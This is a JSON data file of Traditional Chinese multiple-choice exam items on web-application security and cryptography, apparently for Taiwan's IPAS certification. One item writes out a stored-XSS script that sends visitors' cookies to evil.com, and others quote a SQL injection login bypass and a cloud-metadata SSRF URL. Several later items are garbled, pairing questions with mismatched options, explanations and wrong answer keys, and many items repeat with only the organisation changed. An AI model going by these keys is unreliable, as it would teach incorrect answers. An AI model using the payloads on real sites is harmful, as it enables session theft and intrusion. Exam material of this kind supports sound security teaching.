        "zh": "跨網站請求偽造",
        "ipa": "/ˌsiː.es.ɑːrˈef/"
      }
    ],
    "explanation": "CSRF Token 與 SameSite=Lax/Strict Cookie 能有效防止外部偽造請求隨同瀏覽器 Cookie 一併發送。",
    "trap": "單純依賴 Referer 容易被繞過或因隱私策略被瀏覽器移除。",
    "law": "OWASP CSRF 防禦指引"
  },
  {
    "id": "IPAS-B-476",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某公務機關資訊處的雲端 Web 服務具備「自訂圖片網址抓取頭像」功能。攻擊者輸入 `http://169.254.169.254/latest/meta-data/` 成功刺探並取得雲端主機之臨時 IAM 存取金鑰。此漏洞屬於：",
    "options": [
      "A. 本地檔案包含（LFI）",
      "B. 中間人攻擊（MitM）",
      "C. 伺服器端請求偽造（SSRF, Server-Side Request Forgery）",
      "D. 跨網站腳本（XSS）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      },
      {
        "en": "SSRF",
        "zh": "伺服器端請求偽造",
        "ipa": "/ˌes.es.ɑːrˈef/"
      },
      {
        "en": "MitM",
        "zh": "中間人攻擊",
        "ipa": "/mæn ɪn ðə ˈmɪd.əl/"
      }
    ],
    "explanation": "誘騙後端伺服器向內部網路或雲端 Metadata 服務發起未授權連線並回傳機敏資料，為標準的 SSRF 漏洞。",
    "trap": "防禦應採用嚴格網址白名單並阻斷對私有 IP 與 169.254.169.254 之存取。",
    "law": "OWASP Top 10 A10 SSRF"
  },
  {
    "id": "IPAS-B-477",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某區域教學醫學中心上線之生產環境網站，因工程師疏失保留了測試階段的 `Debug = True` 設定，當網頁拋出例外時，錯誤頁面詳細印出了資料庫連接字串、帳號密碼與後端代碼路徑。此漏洞屬於：",
    "options": [
      "A. 注入漏洞",
      "B. 安全性設定錯誤（Security Misconfiguration）",
      "C. 身分識別及驗證失敗",
      "D. 軟體供應鏈弱點"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "在正式環境開啟除錯模式（Debug Mode）洩漏詳細系統組態與錯誤堆疊資訊，屬於典型的安全性設定錯誤。",
    "trap": "正式上線前必須關閉 Debug 並將錯誤頁面自訂為通用友善提示。",
    "law": "OWASP Top 10 A05 Security Misconfiguration"
  },
  {
    "id": "IPAS-B-478",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某跨國金融控股銀行資安人員在檢視網站 Cookie 設定時，發現儲存 Session ID 的 Cookie 未啟用 `HttpOnly` 屬性標記。此疏漏會直接導致何種風險加劇？",
    "options": [
      "A. 瀏覽器將無法關閉",
      "B. 攻擊者一旦透過 XSS 漏洞注入 JavaScript，即可直接透過 `document.cookie` 讀取並盜走 Session ID",
      "C. 資料庫會被自動清空",
      "D. 伺服器將無法解析 Cookie"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      }
    ],
    "explanation": "HttpOnly 標記指示瀏覽器禁止任何客戶端腳本（如 JS）存取該 Cookie，能大幅降低 XSS 竊取 Session 的危害。",
    "trap": "Cookie 還應搭配 Secure（僅 HTTPS 傳送）與 SameSite 屬性。",
    "law": "RFC 6265"
  },
  {
    "id": "IPAS-B-479",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某區域教學醫學中心的內部文件管理系統允許使用者上傳頭像，但後端未驗證副檔名，導致攻擊者直接上傳了 `shell.aspx` 檔案並在伺服器上成功執行任意指令。此安全弱點稱為：",
    "options": [
      "A. 跨網站請求偽造（CSRF）",
      "B. 不受限制的任意檔案上傳（Unrestricted File Upload 導致 WebShell）",
      "C. 阻斷服務攻擊",
      "D. SQL 注入攻擊"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "CSRF",
        "zh": "跨網站請求偽造",
        "ipa": "/ˌsiː.es.ɑːrˈef/"
      }
    ],
    "explanation": "未檢查副檔名與 MIME 類型允許上傳可執行動態腳本（如 aspx, php），攻擊者可直接連線執行取得伺服器控制權。",
    "trap": "上傳目錄應禁止執行權限（No-Execute）並重新隨機命名檔案。",
    "law": "OWASP 檔案上傳安全指南"
  },
  {
    "id": "IPAS-B-480",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠在進行靜態應用程式安全測試（SAST）時，資安工具回報系統直接將前端傳遞的序列化資料以 `readObject()` 進行還原，極易遭注入惡意 Gadget Chain 執行任意代碼。此漏洞稱為：",
    "options": [
      "A. 網路斷線",
      "B. 緩衝區溢位",
      "C. 不安全還原（Insecure Deserialization 導致遠端程式碼執行 RCE）",
      "D. 密碼過期"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "不安全還原可遭攻擊者構造之惡意物件在被反序列化時觸發任意代碼執行（RCE），危害極大。",
    "trap": "應避免對不受信任資料直接反序列化，優先使用 JSON 等純資料格式。",
    "law": "OWASP Top 10 A08 軟體與資料完整性失效"
  },
  {
    "id": "IPAS-B-481",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某知名大型網路電商平台的會員登入網頁，若使用者在帳號欄位輸入 `' OR 1=1 --`，系統竟然直接繞過密碼檢驗以第一個管理者帳號成功登入。此漏洞之根本成因為何？開發團隊應如何徹底修復？",
    "options": [
      "A. 加大資料庫伺服器記憶體",
      "B. 僅在前端 JavaScript 阻擋單引號輸入",
      "C. 強制採用參數化查詢（Parameterized Queries）或預備語句（Prepared Statements）",
      "D. 將資料庫管理員帳號改為 root"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "參數化查詢將 SQL 語句邏輯與資料參數嚴格分離，使用者輸入的任何內容僅會被當作純資料處理，無法改變 SQL 結構，彻底根除 SQL 注入。",
    "trap": "前端檢查極易透過 Burp Suite 繞過，防護必須在後端實現。",
    "law": "OWASP Top 10 A03 注入防護"
  },
  {
    "id": "IPAS-B-482",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某國立頂尖研究型大學的客戶討論區留言板中，某使用者留言含有 `<script>document.location='http://evil.com/?c='+document.cookie;</script>`。其他訪客瀏覽該留言時，管理者 Session 憑證遭竊取。此漏洞型態屬於：",
    "options": [
      "A. 反射型跨網站腳本（Reflected XSS）",
      "B. SQL 注入攻擊（SQLi）",
      "C. DOM 型跨網站腳本（DOM-based XSS）",
      "D. 儲存型跨網站腳本（Stored XSS）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      }
    ],
    "explanation": "惡意腳本存入資料庫留言板中，後續所有瀏覽該頁面的訪客皆會自動執行該腳本並受害，屬於最嚴重的儲存型 XSS（Stored XSS）。",
    "trap": "反射型需要點擊釣魚連結，儲存型則持久保存在伺服器端。",
    "law": "OWASP Top 10 A03 注入與 XSS"
  },
  {
    "id": "IPAS-B-483",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某國立頂尖研究型大學的電子商務訂單查詢介面，網址為 `https://shop.example.com/order?id=1055`。若攻擊者直接將網址修改為 `id=1056`，便能輕易閱覽其他消費者的完整個資與購買紀錄。此安全漏洞屬於：",
    "options": [
      "A. 緩衝區溢位（Buffer Overflow）",
      "B. 密碼學失效（Cryptographic Failure）",
      "C. 權限控制失效（Broken Access Control / IDOR）",
      "D. 阻斷服務攻擊（DDoS）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      },
      {
        "en": "IDOR",
        "zh": "不安全的直接物件參照",
        "ipa": "/ˈaɪ.dɔːr/"
      },
      {
        "en": "Buffer Overflow",
        "zh": "緩衝區溢位",
        "ipa": "/ˈbʌf.ɚ ˈoʊ.vɚˌfloʊ/"
      }
    ],
    "explanation": "直接修改物件識別碼存取他人資料，屬於不安全的直接物件參照（IDOR），本質上為後端未驗證當前登入者是否具備該資料擁有權的「權限控制失效」。",
    "trap": "現為 OWASP Top 10 排名第一之重大弱點類別。",
    "law": "OWASP Top 10 A01 Broken Access Control"
  },
  {
    "id": "IPAS-B-484",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某國立頂尖研究型大學委外開發之 Web 應用系統，資料庫將所有會員的使用者密碼以單純 MD5 雜湊且「未加鹽（Salt）」存儲，且使用者登入過程採用純 HTTP 未加密傳輸。在 OWASP Top 10 中屬於哪一類別？",
    "options": [
      "A. 安全性設定錯誤",
      "B. 注入攻擊",
      "C. 軟體及資料完整性失效",
      "D. 密碼學失效（Cryptographic Failures）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "使用已被證實不安全之 MD5 且未加鹽保護，外加明文 HTTP 傳輸，屬於典型的密碼學失效。",
    "trap": "現代密碼存儲應採用 Argon2id、bcrypt 或 PBKDF2 並強制加鹽。",
    "law": "OWASP Top 10 A02 Cryptographic Failures"
  },
  {
    "id": "IPAS-B-485",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某高科技晶圓代工大廠網路銀行系統為防止惡意第三方網站誘使已登入受害者瀏覽器發送未授權轉帳請求（CSRF 攻擊），在前後端架構上最應加入下列何項防禦機制？",
    "options": [
      "A. 取消所有使用者的登入功能",
      "B. 實作不可預測之一次性 CSRF Token（或同步權杖）並設置 Cookie SameSite 屬性",
      "C. 採用更長的使用者密碼",
      "D. 僅依賴 HTTP Referer 檢查"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "CSRF",
        "zh": "跨網站請求偽造",
        "ipa": "/ˌsiː.es.ɑːrˈef/"
      }
    ],
    "explanation": "CSRF Token 與 SameSite=Lax/Strict Cookie 能有效防止外部偽造請求隨同瀏覽器 Cookie 一併發送。",
    "trap": "單純依賴 Referer 容易被繞過或因隱私策略被瀏覽器移除。",
    "law": "OWASP CSRF 防禦指引"
  },
  {
    "id": "IPAS-B-486",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某國立頂尖研究型大學的雲端 Web 服務具備「自訂圖片網址抓取頭像」功能。攻擊者輸入 `http://169.254.169.254/latest/meta-data/` 成功刺探並取得雲端主機之臨時 IAM 存取金鑰。此漏洞屬於：",
    "options": [
      "A. 本地檔案包含（LFI）",
      "B. 伺服器端請求偽造（SSRF, Server-Side Request Forgery）",
      "C. 跨網站腳本（XSS）",
      "D. 中間人攻擊（MitM）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      },
      {
        "en": "SSRF",
        "zh": "伺服器端請求偽造",
        "ipa": "/ˌes.es.ɑːrˈef/"
      },
      {
        "en": "MitM",
        "zh": "中間人攻擊",
        "ipa": "/mæn ɪn ðə ˈmɪd.əl/"
      }
    ],
    "explanation": "誘騙後端伺服器向內部網路或雲端 Metadata 服務發起未授權連線並回傳機敏資料，為標準的 SSRF 漏洞。",
    "trap": "防禦應採用嚴格網址白名單並阻斷對私有 IP 與 169.254.169.254 之存取。",
    "law": "OWASP Top 10 A10 SSRF"
  },
  {
    "id": "IPAS-B-487",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某金流與行動支付科技公司上線之生產環境網站，因工程師疏失保留了測試階段的 `Debug = True` 設定，當網頁拋出例外時，錯誤頁面詳細印出了資料庫連接字串、帳號密碼與後端代碼路徑。此漏洞屬於：",
    "options": [
      "A. 安全性設定錯誤（Security Misconfiguration）",
      "B. 注入漏洞",
      "C. 軟體供應鏈弱點",
      "D. 身分識別及驗證失敗"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "在正式環境開啟除錯模式（Debug Mode）洩漏詳細系統組態與錯誤堆疊資訊，屬於典型的安全性設定錯誤。",
    "trap": "正式上線前必須關閉 Debug 並將錯誤頁面自訂為通用友善提示。",
    "law": "OWASP Top 10 A05 Security Misconfiguration"
  },
  {
    "id": "IPAS-B-488",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某金流與行動支付科技公司資安人員在檢視網站 Cookie 設定時，發現儲存 Session ID 的 Cookie 未啟用 `HttpOnly` 屬性標記。此疏漏會直接導致何種風險加劇？",
    "options": [
      "A. 攻擊者一旦透過 XSS 漏洞注入 JavaScript，即可直接透過 `document.cookie` 讀取並盜走 Session ID",
      "B. 資料庫會被自動清空",
      "C. 瀏覽器將無法關閉",
      "D. 伺服器將無法解析 Cookie"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      }
    ],
    "explanation": "HttpOnly 標記指示瀏覽器禁止任何客戶端腳本（如 JS）存取該 Cookie，能大幅降低 XSS 竊取 Session 的危害。",
    "trap": "Cookie 還應搭配 Secure（僅 HTTPS 傳送）與 SameSite 屬性。",
    "law": "RFC 6265"
  },
  {
    "id": "IPAS-B-489",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心的內部文件管理系統允許使用者上傳頭像，但後端未驗證副檔名，導致攻擊者直接上傳了 `shell.aspx` 檔案並在伺服器上成功執行任意指令。此安全弱點稱為：",
    "options": [
      "A. 跨網站請求偽造（CSRF）",
      "B. SQL 注入攻擊",
      "C. 不受限制的任意檔案上傳（Unrestricted File Upload 導致 WebShell）",
      "D. 阻斷服務攻擊"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "CSRF",
        "zh": "跨網站請求偽造",
        "ipa": "/ˌsiː.es.ɑːrˈef/"
      }
    ],
    "explanation": "未檢查副檔名與 MIME 類型允許上傳可執行動態腳本（如 aspx, php），攻擊者可直接連線執行取得伺服器控制權。",
    "trap": "上傳目錄應禁止執行權限（No-Execute）並重新隨機命名檔案。",
    "law": "OWASP 檔案上傳安全指南"
  },
  {
    "id": "IPAS-B-490",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": true,
    "question": "某區域教學醫學中心在進行靜態應用程式安全測試（SAST）時，資安工具回報系統直接將前端傳遞的序列化資料以 `readObject()` 進行還原，極易遭注入惡意 Gadget Chain 執行任意代碼。此漏洞稱為：",
    "options": [
      "A. 不安全還原（Insecure Deserialization 導致遠端程式碼執行 RCE）",
      "B. 密碼過期",
      "C. 緩衝區溢位",
      "D. 網路斷線"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "不安全還原可遭攻擊者構造之惡意物件在被反序列化時觸發任意代碼執行（RCE），危害極大。",
    "trap": "應避免對不受信任資料直接反序列化，優先使用 JSON 等純資料格式。",
    "law": "OWASP Top 10 A08 軟體與資料完整性失效"
  },
  {
    "id": "IPAS-B-491",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": false,
    "question": "防範 SQL 注入攻擊（SQL Injection）最標準、最推薦之根本解決方案為何？",
    "options": [
      "A. 將資料庫管理員帳號改為 root",
      "B. 強制採用參數化查詢（Parameterized Queries）或預備語句（Prepared Statements）",
      "C. 加大資料庫伺服器記憶體",
      "D. 僅在前端 JavaScript 阻擋單引號輸入"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "SQL Injection",
        "zh": "SQL 注入攻擊",
        "ipa": "/ˌes.kjuːˈel ɪnˈdʒek.ʃən/"
      }
    ],
    "explanation": "參數化查詢將 SQL 語句邏輯與資料參數嚴格分離，使用者輸入的任何內容僅會被當作純資料處理，無法改變 SQL 結構，彻底根除 SQL 注入。",
    "trap": "前端檢查極易透過 Burp Suite 繞過，防護必須在後端實現。",
    "law": "OWASP Top 10 A03 注入防護"
  },
  {
    "id": "IPAS-B-492",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": false,
    "question": "關於跨網站腳本攻擊（XSS, Cross-Site Scripting），下列何種防禦措施能有效阻止 JavaScript 腳本讀取敏感的 Session Cookie？",
    "options": [
      "A. 儲存型跨網站腳本（Stored XSS）",
      "B. 反射型跨網站腳本（Reflected XSS）",
      "C. SQL 注入攻擊（SQLi）",
      "D. DOM 型跨網站腳本（DOM-based XSS）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      }
    ],
    "explanation": "惡意腳本存入資料庫留言板中，後續所有瀏覽該頁面的訪客皆會自動執行該腳本並受害，屬於最嚴重的儲存型 XSS（Stored XSS）。",
    "trap": "反射型需要點擊釣魚連結，儲存型則持久保存在伺服器端。",
    "law": "OWASP Top 10 A03 注入與 XSS"
  },
  {
    "id": "IPAS-B-493",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": false,
    "question": "攻擊者透過竄改請求參數中之物件識別碼（如 userID, docID），存取其未被授權閱覽之其他使用者資料，此在 OWASP Top 10 中稱為：",
    "options": [
      "A. 緩衝區溢位（Buffer Overflow）",
      "B. 權限控制失效（Broken Access Control / IDOR）",
      "C. 密碼學失效（Cryptographic Failure）",
      "D. 阻斷服務攻擊（DDoS）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      },
      {
        "en": "IDOR",
        "zh": "不安全的直接物件參照",
        "ipa": "/ˈaɪ.dɔːr/"
      },
      {
        "en": "Buffer Overflow",
        "zh": "緩衝區溢位",
        "ipa": "/ˈbʌf.ɚ ˈoʊ.vɚˌfloʊ/"
      }
    ],
    "explanation": "直接修改物件識別碼存取他人資料，屬於不安全的直接物件參照（IDOR），本質上為後端未驗證當前登入者是否具備該資料擁有權的「權限控制失效」。",
    "trap": "現為 OWASP Top 10 排名第一之重大弱點類別。",
    "law": "OWASP Top 10 A01 Broken Access Control"
  },
  {
    "id": "IPAS-B-494",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": false,
    "question": "在密碼學應用中，為了防範彩虹表（Rainbow Table）離線查表逆向破解使用者密碼，對密碼進行雜湊運算時必須加入何種機制？",
    "options": [
      "A. 注入攻擊",
      "B. 密碼學失效（Cryptographic Failures）",
      "C. 軟體及資料完整性失效",
      "D. 安全性設定錯誤"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "使用已被證實不安全之 MD5 且未加鹽保護，外加明文 HTTP 傳輸，屬於典型的密碼學失效。",
    "trap": "現代密碼存儲應採用 Argon2id、bcrypt 或 PBKDF2 並強制加鹽。",
    "law": "OWASP Top 10 A02 Cryptographic Failures"
  },
  {
    "id": "IPAS-B-495",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": false,
    "question": "關於防禦跨網站請求偽造（CSRF, Cross-Site Request Forgery），下列何者「非」有效防範措施？",
    "options": [
      "A. 取消所有使用者的登入功能",
      "B. 僅依賴 HTTP Referer 檢查",
      "C. 實作不可預測之一次性 CSRF Token（或同步權杖）並設置 Cookie SameSite 屬性",
      "D. 採用更長的使用者密碼"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "CSRF",
        "zh": "跨網站請求偽造",
        "ipa": "/ˌsiː.es.ɑːrˈef/"
      }
    ],
    "explanation": "CSRF Token 與 SameSite=Lax/Strict Cookie 能有效防止外部偽造請求隨同瀏覽器 Cookie 一併發送。",
    "trap": "單純依賴 Referer 容易被繞過或因隱私策略被瀏覽器移除。",
    "law": "OWASP CSRF 防禦指引"
  },
  {
    "id": "IPAS-B-496",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": false,
    "question": "伺服器端請求偽造（SSRF, Server-Side Request Forgery）攻擊之核心威脅在於：",
    "options": [
      "A. 中間人攻擊（MitM）",
      "B. 跨網站腳本（XSS）",
      "C. 本地檔案包含（LFI）",
      "D. 伺服器端請求偽造（SSRF, Server-Side Request Forgery）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      },
      {
        "en": "SSRF",
        "zh": "伺服器端請求偽造",
        "ipa": "/ˌes.es.ɑːrˈef/"
      },
      {
        "en": "MitM",
        "zh": "中間人攻擊",
        "ipa": "/mæn ɪn ðə ˈmɪd.əl/"
      }
    ],
    "explanation": "誘騙後端伺服器向內部網路或雲端 Metadata 服務發起未授權連線並回傳機敏資料，為標準的 SSRF 漏洞。",
    "trap": "防禦應採用嚴格網址白名單並阻斷對私有 IP 與 169.254.169.254 之存取。",
    "law": "OWASP Top 10 A10 SSRF"
  },
  {
    "id": "IPAS-B-497",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": false,
    "question": "依據 OWASP Top 10 規範，下列何者屬於典型的「安全性設定錯誤（Security Misconfiguration）」？",
    "options": [
      "A. 注入漏洞",
      "B. 身分識別及驗證失敗",
      "C. 安全性設定錯誤（Security Misconfiguration）",
      "D. 軟體供應鏈弱點"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "在正式環境開啟除錯模式（Debug Mode）洩漏詳細系統組態與錯誤堆疊資訊，屬於典型的安全性設定錯誤。",
    "trap": "正式上線前必須關閉 Debug 並將錯誤頁面自訂為通用友善提示。",
    "law": "OWASP Top 10 A05 Security Misconfiguration"
  },
  {
    "id": "IPAS-B-498",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": false,
    "question": "在 HTTP 回應標頭中加入 `Content-Security-Policy (CSP)`，主要能夠有效緩解下列何種前端資安風險？",
    "options": [
      "A. 伺服器將無法解析 Cookie",
      "B. 資料庫會被自動清空",
      "C. 攻擊者一旦透過 XSS 漏洞注入 JavaScript，即可直接透過 `document.cookie` 讀取並盜走 Session ID",
      "D. 瀏覽器將無法關閉"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      }
    ],
    "explanation": "HttpOnly 標記指示瀏覽器禁止任何客戶端腳本（如 JS）存取該 Cookie，能大幅降低 XSS 竊取 Session 的危害。",
    "trap": "Cookie 還應搭配 Secure（僅 HTTPS 傳送）與 SameSite 屬性。",
    "law": "RFC 6265"
  },
  {
    "id": "IPAS-B-499",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": false,
    "question": "防範任意檔案上傳（Unrestricted File Upload）漏洞的最佳實務，不包括下列何者？",
    "options": [
      "A. 不受限制的任意檔案上傳（Unrestricted File Upload 導致 WebShell）",
      "B. SQL 注入攻擊",
      "C. 跨網站請求偽造（CSRF）",
      "D. 阻斷服務攻擊"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "CSRF",
        "zh": "跨網站請求偽造",
        "ipa": "/ˌsiː.es.ɑːrˈef/"
      }
    ],
    "explanation": "未檢查副檔名與 MIME 類型允許上傳可執行動態腳本（如 aspx, php），攻擊者可直接連線執行取得伺服器控制權。",
    "trap": "上傳目錄應禁止執行權限（No-Execute）並重新隨機命名檔案。",
    "law": "OWASP 檔案上傳安全指南"
  },
  {
    "id": "IPAS-B-500",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "應用系統安全與 OWASP Top 10",
    "scenario": false,
    "question": "當應用程式未對不可信來源的序列化資料進行安全校驗即直接進行還原（Deserialization），最嚴重的潛在危害為：",
    "options": [
      "A. 密碼過期",
      "B. 緩衝區溢位",
      "C. 網路斷線",
      "D. 不安全還原（Insecure Deserialization 導致遠端程式碼執行 RCE）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "不安全還原可遭攻擊者構造之惡意物件在被反序列化時觸發任意代碼執行（RCE），危害極大。",
    "trap": "應避免對不受信任資料直接反序列化，優先使用 JSON 等純資料格式。",
    "law": "OWASP Top 10 A08 軟體與資料完整性失效"
  },
  {
    "id": "IPAS-B-501",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團資料工程師需要對儲存於磁碟陣列中高達 10TB 的顧客交易歷史資料進行全量靜態加密（Data at Rest Encryption）。考量大量資料加密的運算效能與安全強度，最適當之加密演算法為：",
    "options": [
      "A. RSA-4096（非對稱演算法）",
      "B. MD5（單向雜湊演算法）",
      "C. AES-256（進階加密標準，具極高運算效能與強安全性）",
      "D. Caesar 凱薩密碼"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "AES",
        "zh": "進階加密標準 (對稱式)",
        "ipa": "/ˌeɪ.iːˈes/"
      },
      {
        "en": "RSA",
        "zh": "RSA 非對稱加密演算法",
        "ipa": "/ˌɑːr.esˈeɪ/"
      }
    ],
    "explanation": "AES-256 為對稱式區塊加密，運算極為迅速且耗費資源少，是大量資料（Data at Rest）加密的首選；非對稱加密過於緩慢不適於大資料直接加密。",
    "trap": "切勿選擇 RSA 進行全量大資料儲存加密，效率會嚴重低落。",
    "law": "NIST SP 800-175B"
  },
  {
    "id": "IPAS-B-502",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某國立頂尖研究型大學規劃於網際網路上由客戶端向伺服器安全傳送機密合約，若採用 RSA 非對稱加密機制確保該合約「僅有伺服器能夠解密閱讀」，客戶端應使用何種金鑰進行加密？",
    "options": [
      "A. 伺服器的私鑰（Server's Private Key）",
      "B. 客戶端自己的私鑰",
      "C. 伺服器的公鑰（Server's Public Key）",
      "D. 客戶端自己的公鑰"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "RSA",
        "zh": "RSA 非對稱加密演算法",
        "ipa": "/ˌɑːr.esˈeɪ/"
      }
    ],
    "explanation": "機密傳輸原則：使用『接收方的公鑰』加密，唯有持有對應私鑰的接收方（伺服器）方能解密閱讀。",
    "trap": "私鑰絕不可公開給他人使用，公鑰才是公開給大眾加密傳給自己。",
    "law": "PKI 基礎原理"
  },
  {
    "id": "IPAS-B-503",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心軟體發布平台為讓使用者下載安裝檔時能夠驗證軟體在傳輸過程中未遭惡意竄改，在官方網站上公佈了安裝檔的 SHA-256 雜湊值。此應用主要利用了雜湊函數的何種安全特性？",
    "options": [
      "A. 資料完整性（Integrity）驗證，確保檔案未遭竄改或損毀",
      "B. 資料機密性（Confidentiality）加密",
      "C. 交易不可否認性",
      "D. 伺服器身分鑑別"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "Confidentiality",
        "zh": "機密性",
        "ipa": "/ˌkɑːn.fə.den.ʃiˈæl.ə.t̬i/"
      },
      {
        "en": "Integrity",
        "zh": "完整性",
        "ipa": "/ɪnˈteɡ.rə.t̬i/"
      },
      {
        "en": "SHA-256",
        "zh": "安全雜湊演算法 256 位元",
        "ipa": "/ʃɑː tuː fɪf.ti sɪks/"
      }
    ],
    "explanation": "雜湊函數具單向性與抗碰撞性，檔案遭竄改哪怕 1 個 bit 雜湊值即劇烈改變，因此適合用作完整性比對校驗。",
    "trap": "單純提供 Hash 無法達成不可否認性（因未綁定個人私鑰簽章）。",
    "law": "NIST FIPS 180-4"
  },
  {
    "id": "IPAS-B-504",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心為推動電子採購系統，要求投標廠商送出的標單必須具備法律證據能力，確保標單內容未被變造且廠商事後無法推諉否認投標。該系統必須採用下列何種密碼學機制？",
    "options": [
      "A. 建立 VPN 虛擬私人通道",
      "B. 對稱式 AES-128 加密",
      "C. 設定高強度資料庫密碼",
      "D. 數位簽章（Digital Signature，利用投標廠商專屬私鑰簽署）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "VPN",
        "zh": "虛擬私人網路",
        "ipa": "/ˌviː.piːˈen/"
      },
      {
        "en": "AES",
        "zh": "進階加密標準 (對稱式)",
        "ipa": "/ˌeɪ.iːˈes/"
      },
      {
        "en": "Digital Signature",
        "zh": "數位簽章",
        "ipa": "/ˈdɪdʒ.ə.t̬əl ˈsɪɡ.nə.tʃɚ/"
      }
    ],
    "explanation": "數位簽章結合非對稱密碼學私鑰專屬性與 Hash 完整性，兼具完整性、真實性與法律上的不可否認性。",
    "trap": "對稱加密雙方皆有金鑰，事後雙方皆可推諉是對方偽造。",
